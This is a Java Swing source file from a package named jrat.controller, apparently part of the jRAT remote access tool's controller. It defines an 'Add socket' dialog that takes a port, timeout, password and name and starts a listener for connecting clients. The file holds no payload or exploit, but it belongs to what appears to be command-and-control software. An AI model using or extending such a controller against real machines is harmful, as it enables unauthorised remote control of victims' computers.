package jrat.controller.ui.frames;

import jrat.api.Resources;
import jrat.controller.ErrorDialog;
import jrat.controller.net.PortListener;
import jrat.controller.net.ServerListener;
import jrat.controller.settings.Settings;
import jrat.controller.ui.components.JPlaceholderTextField;
import jrat.controller.utils.Utils;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Random;

@SuppressWarnings("serial")
public class FrameAddSocket extends BaseFrame {

    private JTextField txtPass;
	private JSpinner sTimeout;
	private JSpinner sPort;
	private JTextField txtName;
	private JComboBox<String> cbType;

	public FrameAddSocket() {
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameAddSocket.class.getResource("/socket-add.png")));
		setResizable(false);
		setTitle("Add socket");
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		setBounds(100, 100, 299, 217);
        JPanel contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JLabel lblPort = new JLabel("Port:");

		JLabel lblTimeout = new JLabel("Timeout:");

		sPort = new JSpinner();
		sPort.setModel(new SpinnerNumberModel(1336, 1, 65555, 1));

		sTimeout = new JSpinner();
		sTimeout.setModel(new SpinnerNumberModel(15, 1, 60, 1));

		JLabel lblSeconds = new JLabel("seconds");

		JLabel lblPass = new JLabel("Pass:");

		txtPass = new JTextField();
		txtPass.setColumns(10);

		JButton btnListen = new JButton("Listen");
		btnListen.setIcon(Resources.getIcon("socket-add"));
		btnListen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				addSocket();
			}
		});

		JLabel lblName = new JLabel("Name:");

		txtName = new JPlaceholderTextField("Socket");
		txtName.setText("Socket" + (new Random().nextInt(10000)));
		txtName.setColumns(10);
		
		JLabel lblType = new JLabel("Type:");
		
		cbType = new JComboBox<>();
		cbType.setModel(new DefaultComboBoxModel<>(new String[]{"Client Listener"}));
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.TRAILING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addContainerGap()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
								.addComponent(lblName)
								.addComponent(lblTimeout)
								.addComponent(lblPass)
								.addComponent(lblPort)
								.addComponent(lblType))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
								.addComponent(txtName, 217, 217, Short.MAX_VALUE)
								.addComponent(sPort, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE)
								.addGroup(gl_contentPane.createSequentialGroup()
									.addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE)
									.addPreferredGap(ComponentPlacement.RELATED)
									.addComponent(lblSeconds))
								.addComponent(txtPass, GroupLayout.DEFAULT_SIZE, 217, Short.MAX_VALUE)
								.addComponent(cbType, 0, 217, Short.MAX_VALUE)))
						.addComponent(btnListen, Alignment.TRAILING))
					.addContainerGap())
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addGap(8)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblName)
						.addComponent(txtName, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(sPort, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblPort))
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGap(11)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblTimeout)
								.addComponent(lblSeconds)))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
						.addComponent(lblPass))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblType)
						.addComponent(cbType, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED, 16, Short.MAX_VALUE)
					.addComponent(btnListen)
					.addContainerGap())
		);
		contentPane.setLayout(gl_contentPane);
		Utils.center(this);
	}

	public void addSocket() {
		try {
			int port = Integer.parseInt(sPort.getValue().toString());
			int timeout = Integer.parseInt(sTimeout.getValue().toString()) * 1000;
			String pass = txtPass.getText().trim();
			String name = txtName.getText().trim();
			int type = cbType.getSelectedIndex();

			if (pass.length() == 0) {
				throw new Exception("Password length must be over 0");
			} else if (name.length() == 0) {
				name = "Socket" + (new Random()).nextInt(10000);
			}
			
			PortListener connection = null;
			if (type == Settings.SocketType.SOCKET_NORMAL) {
				connection = new ServerListener(name, port, timeout, pass);
			}
			connection.start();
			setVisible(false);
			dispose();
		} catch (Exception ex) {
			ex.printStackTrace();
			ErrorDialog.create(ex);
		}
	}
}
